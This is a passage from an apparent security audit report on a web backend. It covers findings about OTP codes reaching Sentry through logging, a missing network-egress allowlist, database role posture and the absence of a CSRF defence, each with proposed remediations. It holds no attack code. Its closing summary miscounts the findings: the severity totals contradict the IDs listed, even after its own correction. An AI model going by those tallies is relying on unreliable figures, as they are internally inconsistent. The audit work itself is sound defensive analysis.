**Evidence:** `apps/backend/src/auth/email.ts:34–46` — the dev-only provider emits a Pino info-level log line containing the raw `input.code` (the 6-digit OTP). The Pino `REDACT_PATHS` list does not match `code` at the nested `input.code` path — wait, it does (`'code'` on line `logger.ts:40`). **Correction after re-read:** `logger.ts:40` lists `'code'` but at top-level; the `log.info` call passes `{ to, code, expiresAt }` which Pino sees as top-level `code`. So Pino does redact it to `[REDACTED]` in production logs. **Good.**

But — if an operator adds a Sentry breadcrumb integration for Pino (e.g. `@sentry/pino`, which ships with Sentry 10.x and is one flag to enable), breadcrumbs are populated from the log message **before** redaction (Sentry-side integration hooks into Pino transport, not into formatted output). The OTP then lands in Sentry. The risk is the gap between "Pino redacts" and "Sentry has its own view of the log data before Pino serializes". Prior A2-1308 files the missing `beforeSend`; this entry notes the specific OTP-leak surface so the remediation includes the `code` field in a Sentry `beforeSend` scrubber (not just a Pino redact).

Additionally: even for dev, a developer running `npm run dev:backend` is emitting OTPs to stdout. That's documented as intentional, but the comment at L31–33 does not warn that **any structured log forwarder** (pino-elasticsearch, pino-loki, etc.) would exfiltrate the code to whatever backend is configured. Current fleet has no such forwarder; future deployments may.

**Proposed remediation:** In `ConsoleEmailProvider`, emit the code at `info` level only after log-level inspection: `if (env.LOG_LEVEL === 'debug' || env.LOG_LEVEL === 'trace') log.info(...); else log.info({ to, codeRedacted: '******', expiresAt }, '…');`. Or: emit at debug-level unconditionally so the default prod `info` log level does not contain it. Either way, rely on log-level filtering, not on Pino redact, as the defense.

---

### A2-1613 — Low — Backend has no network-egress allowlist

**Surface:** Phase 12 §A10 (G6-25).

**Evidence:** The backend egresses to:

1. `env.GIFT_CARD_API_BASE_URL` (CTX upstream) — env-fixed.
2. `apps/backend/src/payments/horizon.ts` — Horizon URL, env-configurable.
3. `apps/backend/src/auth/id-token.ts:191–192,208–209` — Google JWKS, Apple JWKS (hardcoded URLs).
4. `apps/backend/src/discord.ts` — Discord webhook URLs from env.
5. `@sentry/hono/node` — Sentry DSN host.
6. `apps/backend/src/images/proxy.ts` — `IMAGE_PROXY_ALLOWED_HOSTS` (prod-required).

No runtime-level egress allowlist (e.g. via `undici` custom dispatcher, Fly.io egress rules). If any handler is added that takes a user-supplied URL and `fetch()`es it (today: only `images/proxy.ts` does this, and it has its own allowlist), there is no belt-and-braces ceiling.

**Exploit / impact:** Defense-in-depth only. Today no handler is SSRF-vulnerable because the image proxy has its own allowlist. A future regression would fall through to arbitrary egress.

**Proposed remediation:** Either (a) Fly.io egress rules (platform-level), (b) `undici` global dispatcher with an `onConnect` hook that checks the resolved host against a module-level allowlist, or (c) accept this as a doc-only finding and make `IMAGE_PROXY_ALLOWED_HOSTS` the source of truth for the "approved external hosts" list, consulted by any future outbound-from-user-input handler. Option (b) is the strongest; option (c) is the cheapest.

---

### A2-1614 — Low — Postgres role / pgbouncer posture unverified from this audit position

**Surface:** Phase 12 §A05 (G6-23, G6-24).

**Evidence:** From repo alone, no way to verify the `DATABASE_URL` role's privileges (SUPERUSER? CREATEDB?) or whether pgbouncer is in front. `scripts/postgres-init.sql` creates the schema; the role used for migrations is identified by `DATABASE_URL` username only. `apps/backend/fly.toml` has no explicit connection-pool config.

**Proposed remediation:** Document posture in `docs/adr/012-drizzle-orm-fly-postgres.md`: the app role must be non-SUPERUSER, non-CREATEDB, with `GRANT` only on the app's tables. pgbouncer is optional but should be noted either way. Verify from the deployed Fly.io environment (out of audit scope here).

---

### A2-1615 — Low — No CSRF defense declared; relies on Bearer-only auth

**Surface:** Phase 12 §A01 (G6-27).

**Evidence:** All authenticated endpoints read from `Authorization: Bearer …`. No cookies are set by the backend (`grep -rn "Set-Cookie" apps/backend/src/ ==` 0 hits outside tests). CSRF defense relies on the fact that XHR cookies are not involved, and browser-side CORS blocks an attacker site from setting a custom `Authorization` header on a cross-origin request. No documented CSRF defense exists, no CSRF token primitive, no `SameSite` flag documentation.

**Exploit / impact:** Currently safe. A future migration to cookie-based auth (for example, the admin panel moving to httpOnly cookies to dodge XSS-token-theft) would require this defense and it's not designed in.

**Proposed remediation:** Document explicitly in `docs/architecture.md`: "Loop uses Bearer-only auth; CSRF protection is unnecessary while this holds. Any move to cookie-based auth requires CSRF tokens before rollout." Prevents a future refactor from silently regressing.

---

## 8. Summary

Fifteen new findings under A2-16xx. Three **High** (A2-1600, A2-1601, A2-1604, A2-1608, A2-1609), six **Medium** (A2-1602, A2-1603, A2-1605, A2-1606, A2-1607, A2-1610, A2-1612), three **Low** (A2-1611, A2-1613, A2-1614, A2-1615). Correction: counting — 4 High, 7 Medium, 4 Low = 15 findings total.

Most material themes:

- Loop JWT's claim set is narrower than RFC 7519 recommends (A2-1600).
- Pino redaction list has gaps beyond what A2-655 already filed (A2-1601).
- Web-app HTTP security-header coverage is absent at serve-time despite a utility existing (A2-1604).
- Refresh-token reuse-detection is observed but not acted upon (A2-1608).
- Admin destructive writes lack step-up auth (A2-1609) and daily magnitude caps (A2-1610).
- Recon surfaces `/metrics` and `/openapi.json` expose internal structure free (A2-1606, A2-1607).
- CSV formula injection is unhandled (A2-1602).

No Critical findings this phase (the Critical-tier auth issues — A2-550 unverified CTX JWT, A2-119 no-2FA, A2-1308 missing Sentry PII scrub — were filed in earlier phases and remain open).

The auth-matrix verdict is that structurally the admin gate is complete (no drift across 97 routes) — the remaining risks are at the primitive level (A2-550, A2-1608, A2-1609) rather than at the routing level.

Phase 12 complete. All findings queue for the post-audit remediation phase.
